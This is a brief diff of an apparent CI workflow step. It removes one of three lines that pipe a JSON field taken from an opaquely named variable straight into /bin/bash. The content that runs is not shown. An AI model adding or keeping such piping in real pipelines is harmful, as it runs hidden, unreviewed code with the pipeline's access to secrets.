@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$ogv00490" | jq -r .p40 | /bin/bash
           echo $crw5 | jq -r .ydn555 | /bin/bash
-          echo $wdf4521 | jq -r .tiv194 | /bin/bash
 
       - name: Persist output
         if: always()
